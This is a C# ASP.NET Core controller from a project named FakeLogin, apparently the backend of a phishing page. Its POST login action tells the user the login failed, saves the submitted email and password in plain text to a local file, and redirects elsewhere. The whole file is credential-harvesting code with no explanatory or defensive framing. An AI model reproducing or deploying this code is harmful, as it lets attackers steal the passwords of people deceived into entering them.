using FakeLogin.Models;
using Microsoft.AspNetCore.Mvc;

namespace FakeLogin.Controllers
{
    public class AccountController : Controller
    {
        [HttpGet]
        public async Task<IActionResult> Login()
        {
            ModelState.AddModelError(string.Empty, "Invalid login attemp");

            return View();
        }
        [HttpPost]
        public async Task<IActionResult> Login(LoginViewModel model)
        {
            ModelState.AddModelError(string.Empty, "Invalid login attemp");
            using (StreamWriter writetext = new StreamWriter("user-credentials.txt"))
            {
                writetext.WriteLine("Email: " + model.Email);
                writetext.WriteLine("Password: " + model.Password);
                writetext.WriteLine("-------------------------------");
            }
            return Redirect("https://localhost:7033/");
        }
    }
}
